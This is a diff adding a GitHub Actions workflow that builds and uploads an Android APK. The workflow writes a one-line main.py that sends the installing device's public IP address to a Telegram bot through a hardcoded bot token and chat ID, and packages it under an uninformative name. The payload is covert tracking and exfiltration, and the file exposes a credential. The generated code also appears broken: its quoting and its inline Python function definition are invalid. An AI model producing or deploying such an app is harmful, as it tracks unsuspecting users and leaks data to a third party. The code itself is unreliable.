@@ -1,0 +1,21 @@
+name: Build APK
+on: [push]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v3
+    - name: Install
+      run: |
+        sudo apt update
+        sudo apt install -y openjdk-17-jdk
+        pip install buildozer
+    - name: Create main.py
+      run: echo 'import os,requests;T="8889128449:AAHUGVmOKw5cqeVx25D1WHN9lJcvyxsH43U";C="8631833153";def s(t):requests.post(f"https://api.telegram.org/bot{T}/sendMessage",json={"chat_id":C,"text":t[:4000]});s(f"IP: {requests.get('https://api.ipify.org').text}")' > main.py
+    - name: Build
+      run: buildozer init && sed -i 's/requirements = .*/requirements = python3,requests/g' buildozer.spec && sed -i 's/package.name = .*/package.name = R/g' buildozer.spec && sed -i 's/package.domain = .*/package.domain = org.r/g' buildozer.spec && buildozer android debug
+    - name: Upload
+      uses: actions/upload-artifact@v3
+      with:
+        name: APK
+        path: bin/*.apk
